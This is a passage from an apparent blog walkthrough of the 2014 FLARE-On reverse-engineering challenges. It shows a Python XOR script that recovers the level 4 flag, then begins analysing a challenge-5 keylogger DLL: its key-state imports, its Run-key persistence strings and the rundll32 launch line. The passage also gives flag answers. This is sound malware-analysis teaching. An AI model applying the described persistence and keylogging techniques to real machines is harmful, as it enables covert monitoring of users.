</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">22
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#719e07>def</span> <span style=color:#268bd2>xor</span>(mydata,mykey):
</span></span><span style=display:flex><span>    keylen <span style=color:#719e07>=</span> <span style=color:#b58900>len</span>(mykey)
</span></span><span style=display:flex><span>    datalen <span style=color:#719e07>=</span> <span style=color:#b58900>len</span>(mydata)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#586e75># easier to just extend the key array, but probably not that efficient</span>
</span></span><span style=display:flex><span>    <span style=color:#586e75># not that we care about it here ;)</span>
</span></span><span style=display:flex><span>    key <span style=color:#719e07>=</span> mykey <span style=color:#719e07>*</span> ( (datalen<span style=color:#719e07>/</span>keylen)<span style=color:#719e07>+</span><span style=color:#2aa198>1</span> )
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#719e07>return</span> <span style=color:#2aa198>&#39;&#39;</span><span style=color:#719e07>.</span>join(<span style=color:#b58900>chr</span>(<span style=color:#b58900>ord</span>(a) <span style=color:#719e07>^</span> <span style=color:#b58900>ord</span>(b)) <span style=color:#719e07>for</span> a,b <span style=color:#719e07>in</span> <span style=color:#b58900>zip</span>(mydata,key))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#719e07>from</span> binascii <span style=color:#719e07>import</span> hexlify, unhexlify
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75># last 13 bytes</span>
</span></span><span style=display:flex><span>ciphertext <span style=color:#719e07>=</span> unhexlify(<span style=color:#2aa198>&#34;2574243575216B2A36366B2F3274752E2A2305316B203723256B2B2D46&#34;</span>)[<span style=color:#719e07>-</span><span style=color:#2aa198>13</span>:]
</span></span><span style=display:flex><span>plaintext <span style=color:#719e07>=</span> <span style=color:#2aa198>&#34;@flare-on.com&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#b58900>print</span> xor(ciphertext,plaintext)
</span></span><span style=display:flex><span><span style=color:#b58900>print</span> hexlify( xor (ciphertext,plaintext) )
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75># result - :(</span>
</span></span><span style=display:flex><span><span style=color:#586e75># jEiPELKEHB+</span>
</span></span><span style=display:flex><span><span style=color:#586e75># 6a45695019451a4c4b4548422b</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>Nope. Doesn't look like it.</p><p>I usually wander around in the debugger and look at memory. Run the executable in Immunity and look around in memory after the message box pops up. A little bit further up from the original message we see more <code>OWNED!!!</code> strings (title of the message box). Right before two owneds I saw another string. This one is longer and looks more promising. Right click on it and select <code>Follow in Dump</code>. Select the string and again right click and select <code>Copy > To clipboard</code>. It's in Unicode so <code>5</code> represented as <code>0x0035</code> instead of <code>0x35</code>.</p><p><img src=/images/2014/flare/4-2.jpg alt="Interesting String" title="Interesting String"></p><figure class=code><figcaption><span>Second string in hex</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span># <span style=color:#268bd2>I</span> <span style=color:#b58900>di</span><span style=color:#268bd2>d</span> <span style=color:#268bd2>not</span> <span style=color:#268bd2>select</span> <span style=color:#268bd2>the</span> <span style=color:#268bd2>first</span> <span style=color:#2aa198>00</span> <span style=color:#268bd2>before</span> <span style=color:#2aa198>5</span> (<span style=color:#2aa198>0x0035</span>)
</span></span><span style=display:flex><span>00143868  35 00 24 00 74 00 25 00  5<span style=color:#268bd2>.$.t.</span><span style=color:#719e07>%</span><span style=color:#268bd2>.</span>
</span></span><span style=display:flex><span>00143870  2<span style=color:#268bd2>A</span> <span style=color:#2aa198>00</span> <span style=color:#2aa198>6</span><span style=color:#268bd2>B</span> <span style=color:#2aa198>00</span> <span style=color:#2aa198>21</span> <span style=color:#2aa198>00</span> <span style=color:#2aa198>75</span> <span style=color:#2aa198>00</span>  <span style=color:#719e07>*</span><span style=color:#268bd2>.k.</span>!<span style=color:#268bd2>.u.</span>
</span></span><span style=display:flex><span>00143878  2<span style=color:#268bd2>F</span> <span style=color:#2aa198>00</span> <span style=color:#2aa198>6</span><span style=color:#268bd2>B</span> <span style=color:#2aa198>00</span> <span style=color:#2aa198>36</span> <span style=color:#2aa198>00</span> <span style=color:#2aa198>36</span> <span style=color:#2aa198>00</span>  <span style=color:#719e07>/</span><span style=color:#268bd2>.k.6.6.</span>
</span></span><span style=display:flex><span>00143880  2<span style=color:#268bd2>E</span> <span style=color:#2aa198>00</span> <span style=color:#2aa198>75</span> <span style=color:#2aa198>00</span> <span style=color:#2aa198>74</span> <span style=color:#2aa198>00</span> <span style=color:#2aa198>32</span> <span style=color:#2aa198>00</span>  <span style=color:#268bd2>..u.t.2.</span>
</span></span><span style=display:flex><span>00143888  31 00 05 00 23 00 2<span style=color:#268bd2>A</span> <span style=color:#2aa198>00</span>  <span style=color:#2aa198>1</span><span style=color:#268bd2>.</span><span style=color:#268bd2>.#.</span><span style=color:#719e07>*</span><span style=color:#268bd2>.</span>
</span></span><span style=display:flex><span>00143890  23 00 37 00 20 00 6<span style=color:#268bd2>B</span> <span style=color:#2aa198>00</span>  #<span style=color:#268bd2>.7.</span> <span style=color:#268bd2>.k.</span>
</span></span><span style=display:flex><span>00143898  2<span style=color:#268bd2>D</span> <span style=color:#2aa198>00</span> <span style=color:#2aa198>2</span><span style=color:#268bd2>B</span> <span style=color:#2aa198>00</span> <span style=color:#2aa198>6</span><span style=color:#268bd2>B</span> <span style=color:#2aa198>00</span> <span style=color:#2aa198>25</span> <span style=color:#2aa198>00</span>  <span style=color:#719e07>-</span><span style=color:#268bd2>.</span><span style=color:#719e07>+</span><span style=color:#268bd2>.k.</span><span style=color:#719e07>%</span><span style=color:#268bd2>.</span>
</span></span><span style=display:flex><span>001438<span style=color:#268bd2>A0</span>  <span style=color:#2aa198>2</span><span style=color:#268bd2>D</span> <span style=color:#2aa198>00</span> <span style=color:#2aa198>28</span>                 <span style=color:#719e07>-</span><span style=color:#268bd2>.</span>(
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span># <span style=color:#268bd2>or</span> <span style=color:#268bd2>in</span> <span style=color:#268bd2>Python</span><span style=color:#719e07>-</span><span style=color:#268bd2>friendly</span> <span style=color:#268bd2>format</span>
</span></span><span style=display:flex><span>352474252<span style=color:#268bd2>a6b21752f6b36362e7574323105232a2337206b2d2b6b252d28</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>Let's apply the xor-logic on this string too.</p><figure class=code><figcaption><span>Second string xor</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#586e75># add xor function from last example</span>
</span></span><span style=display:flex><span><span style=color:#719e07>from</span> binascii <span style=color:#719e07>import</span> hexlify, unhexlify
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75># last 13 bytes</span>
</span></span><span style=display:flex><span>ciphertext <span style=color:#719e07>=</span> unhexlify(<span style=color:#2aa198>&#34;352474252a6b21752f6b36362e7574323105232a2337206b2d2b6b252d28&#34;</span>)[<span style=color:#719e07>-</span><span style=color:#2aa198>13</span>:]
</span></span><span style=display:flex><span>plaintext <span style=color:#719e07>=</span> <span style=color:#2aa198>&#34;@flare-on.com&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#b58900>print</span> xor(ciphertext,plaintext)
</span></span><span style=display:flex><span><span style=color:#b58900>print</span> hexlify( xor (ciphertext,plaintext) )
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75># result :)</span>
</span></span><span style=display:flex><span><span style=color:#586e75># EEFBEEFBEEFBE</span>
</span></span><span style=display:flex><span><span style=color:#586e75># 45454642454546424545464245</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>Bingo. The key is <code>BEEF</code>. It is also in the initial shellcode as a string. Let's xor it with the complete string and get the flag.</p><h4 id=level-4-flag>Level 4 flag: <a href=mailto:wa1ch.d3m.spl01ts@flare-on.com>wa1ch.d3m.spl01ts@flare-on.com</a>
<a class=header-link href=#level-4-flag><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h4><hr><h2 id=challenge-5---5get-about-it><a name=ch5></a>Challenge 5 - 5get About It
<a class=header-link href=#challenge-5---5get-about-it><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><pre tabindex=0><code>Another one bites the dust!
Here&#39;s some more fun for you, password is the same as always.
-FLARE
</code></pre><h3 id=be-sure-to-run-this-challenge-in-a-vm>Be sure to run this challenge in a VM.
<a class=header-link href=#be-sure-to-run-this-challenge-in-a-vm><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>The file inside the challenge zip is named <code>5get_it</code> and is around 100KBs. A quick look with <code>HxD</code> says it's a Portable Executable (MZ and PE magic bytes). Let's get some help from <code>PE-Studio</code>. It has a VirusTotal score of 29/55 with most AVs calling it a generic trojan or keylogger. Click on <code>Imported Symbols</code> and look at the red symbols. Some of them are more interesting than others. To get more information about any of them, right click and select <code>Query MSDN</code> inside PE-Studio (handy, neh?).</p><figure class=code><figcaption><span>Interesting symbols</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span><span style=color:#268bd2>RegSetValueExA</span> <span style=color:#719e07>-</span> <span style=color:#268bd2>RegCreateKeyA</span>: <span style=color:#268bd2>Messing</span> <span style=color:#268bd2>with</span> <span style=color:#268bd2>registry</span>
</span></span><span style=display:flex><span><span style=color:#268bd2>CreateFileW</span> <span style=color:#719e07>-</span> <span style=color:#268bd2>CreateFileA</span> <span style=color:#719e07>-</span> <span style=color:#268bd2>WriteFile</span> <span style=color:#719e07>-</span> <span style=color:#268bd2>CopyFileA</span>: <span style=color:#268bd2>Creating</span>, <span style=color:#268bd2>writing</span> <span style=color:#268bd2>to</span>, <span style=color:#268bd2>and</span> <span style=color:#268bd2>copying</span> <span style=color:#268bd2>file</span>
</span></span><span style=display:flex><span>GetAsyncKeyState: &#34;<span style=color:#268bd2>Determines</span> <span style=color:#268bd2>whether</span> <span style=color:#268bd2>a</span> <span style=color:#268bd2>key</span> <span style=color:#268bd2>is</span> <span style=color:#268bd2>up</span> <span style=color:#268bd2>or</span> <span style=color:#268bd2>down</span> <span style=color:#268bd2>at</span> <span style=color:#268bd2>the</span> <span style=color:#268bd2>time</span> <span style=color:#268bd2>the</span> <span style=color:#268bd2>function</span> <span style=color:#268bd2>is</span> <span style=color:#268bd2>called</span>, <span style=color:#268bd2>and</span> <span style=color:#268bd2>whether</span> <span style=color:#268bd2>the</span> <span style=color:#268bd2>key</span> <span style=color:#268bd2>was</span> <span style=color:#268bd2>pressed</span> <span style=color:#268bd2>after</span> <span style=color:#268bd2>a</span> <span style=color:#268bd2>previous</span> <span style=color:#268bd2>call</span> <span style=color:#268bd2>to</span> <span style=color:#268bd2>GetAsyncKeyState</span>&#34;</span></span></code></pre></td></tr></table></div></div></div></figure><p>Also, let's run <code>strings</code> on it. I used <a href=https://www.cygwin.com/ target=_blank rel="noreferrer noopener">cygwin</a>. I have omitted the garbage and only kept the interesting strings:</p><figure class=code><figcaption><span>Interesting strings</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span><span style=color:#268bd2>$</span> <span style=color:#268bd2>strings.exe</span> <span style=color:#2aa198>5</span><span style=color:#268bd2>get_it</span>
</span></span><span style=display:flex><span><span style=color:#268bd2>svchost.log</span>
</span></span><span style=display:flex><span>[<span style=color:#268bd2>SHIFT</span>]
</span></span><span style=display:flex><span>[<span style=color:#268bd2>RETURN</span>]
</span></span><span style=display:flex><span>[<span style=color:#268bd2>BACKSPACE</span>]
</span></span><span style=display:flex><span>[<span style=color:#268bd2>TAB</span>]
</span></span><span style=display:flex><span>[<span style=color:#268bd2>CTRL</span>]
</span></span><span style=display:flex><span>[<span style=color:#268bd2>DELETE</span>]
</span></span><span style=display:flex><span>[<span style=color:#268bd2>CAPS</span> <span style=color:#268bd2>LOCK</span>]
</span></span><span style=display:flex><span><span style=color:#268bd2>SOFTWARE</span>\<span style=color:#268bd2>Microsoft</span>\<span style=color:#268bd2>Windows</span>\<span style=color:#268bd2>CurrentVersion</span>\<span style=color:#268bd2>Run</span>
</span></span><span style=display:flex><span><span style=color:#268bd2>svchost</span>
</span></span><span style=display:flex><span>c:\<span style=color:#268bd2>windows</span>\<span style=color:#268bd2>system32</span>\<span style=color:#268bd2>svchost.dll</span>
</span></span><span style=display:flex><span>c:\<span style=color:#268bd2>windows</span>\<span style=color:#268bd2>system32</span>\<span style=color:#268bd2>rundll32.exe</span> <span style=color:#268bd2>c</span>:\<span style=color:#268bd2>windows</span>\<span style=color:#268bd2>system32</span>\<span style=color:#268bd2>svchost.dll</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>While doing the challenge only the first and last two lines were interesting to me.</p><ul><li>It references <code>c:\windows\system32\svchost.dll</code> and <code>svchost.log</code> but there is no such file (Windows has <code>svchost.exe</code> in that location).</li><li>There is also <code>c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll</code> which means this file is most probably a DLL and should be executed like that. There are no parameters, so whatever this DLL is doing should be in <code>DllMain</code>.</li></ul><p><strong>By this time you probably know what this file is supposed to do (also look at the registry key). However, at that time I did not make the connection :(</strong></p><p>Let's drop this into <code>IDA</code> and jump into DllMain. I used IDA Pro but both IDA free and trial and Immunity Debugger work for this challenge (and also <a href=#ch7>challenge 7</a>). Put a breakpoint at the start of this function (<code>F2</code> key).</p><p><img src=/images/2014/flare/5-1.jpg alt="DLL Entry Point" title="DLL Entry Point"></p><p>If we attempt to execute the tile. IDA will complain. It's a DLL and cannot be run by itself. But we already know how to run it thanks to the strings inside the binary. In IDA first select <code>Local Win32 Debugger</code> then go to <code>Debugger</code> menu and select <code>Process Options</code>. In the <code>Application</code> textbox enter <code>c:\windows\system32\rundll32.exe</code>. In <code>Parameters</code> enter the path to the DLL. Don't forget to rename the file, add dll extension and include double-quotes around the path if it contains spaces (e.g. <code>"c:\Flare Challenges\Ch5\5get_it.dll",0</code>). It didn't work without the dll extension for me.</p><p>Let's start debugging. We observe standard stuff until we reach <code>.text:1000A6BB call sub_1000A570</code>.</p><p><img src=/images/2014/flare/5-2.jpg alt="sub 1000A570" title="sub 1000A570"></p><p>Inside the function we encounter <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms724897%28v=vs.85%29.aspx" target=_blank rel="noreferrer noopener">RegOpenKeyEx</a> that opens a registry key. Full registry key is a combination of <code>hKey</code> and <code>lpSubKey</code>. <code>hKey</code> can be one of the <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms724836%28v=vs.85%29.aspx" target=_blank rel="noreferrer noopener">predefined keys</a>. The constants for the predefined keys needed a bit of googling because the MSDN page didn't list them. Here they are:</p><pre><code>.
| Key                 | Constant |
|---------------------|----------|
| HKEY_CLASSES_ROOT   |    0     |
| HKEY_CURRENT_USER   |    1     |
| HKEY_LOCAL_MACHINE  |    2     |
| HKEY_USERS          |    3     |
| HKEY_CURRENT_CONFIG |    5     |
.
</code></pre><p>The binary is pushing <code>0x02</code> for <code>hKey</code> and <code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> for <code>lpSubKey</code> which will result in the full path <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code>. If function succeeds it will return <code>ERROR_SUCCESS</code> which is 0 according to <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382%28v=vs.85%29.aspx" target=_blank rel="noreferrer noopener">this page</a>, otherwise it will return another error code.</p><p><img src=/images/2014/flare/5-3.jpg alt="Registry Key" title="Registry Key"></p><p>The binary will check if it has access to registry at that path. If so then the return value (in eax) will be 0 and it will jump right (JZ will succeed).<br><a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms724911%28v=vs.85%29.aspx" target=_blank rel="noreferrer noopener">RegQueryValueEx</a> checks if there is a registry key at an open path. It is looking for a registry key named <code>svchost</code> at that path. If such key exists, function will return 0. In this case, it returned 2 which stands for <code>ERROR_FILE_NOT_FOUND</code> meaning there was no such key. Then it will call <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms724837%28v=vs.85%29.aspx" target=_blank rel="noreferrer noopener">RegCloseKey</a> and closes the open registry path. This function's return value is saved in <code>var_110</code> (we will need it later):</p><pre><code>.
|           Condition          |         Return Value          |
|------------------------------|-------------------------------|
|Registry key cannot be opened |               1               |
|Registry key does not exist   |               2               |
|Registry key exists           | 1000A6BB or DllMain(x,x,x)+3B |
.
</code></pre><p>After that function, we see that it is calling <code>GetModuleHandleEx</code> for <code>sub_1000A610</code> in lines 3-8 and checks the return value in line 9. The return value for <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms683200%28v=vs.85%29.aspx" target=_blank rel="noreferrer noopener">GetModuleHandleEx</a> will be non-zero, otherwise it will be zero. If call was not successful then last error will be printed to file.</p><figure class=code><figcaption><span>Returning from sub_1000A570</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">19
